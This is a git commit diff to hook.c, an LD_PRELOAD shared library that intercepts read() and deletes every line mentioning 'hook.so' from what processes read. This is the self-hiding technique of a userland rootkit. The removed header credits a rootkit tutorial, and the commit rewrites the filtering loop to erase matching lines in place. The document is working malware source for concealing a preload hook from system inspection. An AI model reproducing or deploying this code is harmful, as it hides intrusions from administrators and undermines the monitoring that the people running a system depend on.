24dfda413c442491eb9d8ed344e7f2048c61ec3b
Marc Carlson <138807964+carls0n@users.noreply.github.com>
2026-07-10 18:18:53 -0700

    Update hook.c

--- hook.c
+++ hook.c
@@ -1,70 +1,31 @@
-// Code taken from: https://matheuzsecurity.github.io/hacking/ldpreload-rootkit/. Thank you very much!
-
 #define _GNU_SOURCE
 #include <dlfcn.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
-#include <stdlib.h>
 
 ssize_t read(int fd, void *buf, size_t count) {
-    static ssize_t (*real_read)(int, void *, size_t) = NULL;
-
-    if (!real_read) {
-        real_read = dlsym(RTLD_NEXT, "read");
-        if (!real_read) {
-            errno = ENOSYS;
-            return -1;
-        }
-    }
-
+    ssize_t (*real_read)(int, void *, size_t) = dlsym(RTLD_NEXT, "read");
     ssize_t result = real_read(fd, buf, count);
 
     if (result > 0) {
-        char *start = (char *)buf;
-        char *end = start + result;
-        char *current = start;
+        char *match;
+        // Loop as long as "hook.so" exists in the remaining buffer data
+        while ((match = memmem(buf, result, "hook.so", 7)) != NULL) {
+            char *start = (char *)buf;
+            char *end = start + result;
 
-        size_t new_buf_size = result;
-        char *new_buf = (char *)malloc(new_buf_size);
-        if (!new_buf) {
-            errno = ENOMEM;
-            return -1;
+            // Find start and end boundaries of the matching line
+            char *line_start = memrchr(buf, '\n', match - start);
+            line_start = line_start ? line_start + 1 : start;
+
+            char *line_end = memchr(match, '\n', end - match);
+            line_end = line_end ? line_end + 1 : end;
+
+            // Completely erase the line by shifting memory
+            memmove(line_start, line_end, end - line_end);
+            result -= (line_end - line_start);
         }
-
-        size_t new_buf_pos = 0;
-
-        while (current < end) {
-            char *line_start = current;
-            char *line_end = memchr(current, '\n', end - current);
-            if (!line_end) {
-                line_end = end;
-            } else {
-                line_end++;
-            }
-
-            if (!memmem(line_start, line_end - line_start, "hook.so", strlen("hook.so"))) {
-                size_t line_length = line_end - line_start;
-                if (new_buf_pos + line_length > new_buf_size) {
-                    new_buf_size = new_buf_pos + line_length;
-                    new_buf = (char *)realloc(new_buf, new_buf_size);
-                    if (!new_buf) {
-                        errno = ENOMEM;
-                        return -1;
-                    }
-                }
-                memcpy(new_buf + new_buf_pos, line_start, line_length);
-                new_buf_pos += line_length;
-            }
-
-            current = line_end;
-        }
-
-        memcpy(buf, new_buf, new_buf_pos);
-        result = new_buf_pos;
-
-        free(new_buf);
     }
-
     return result;
 }
+
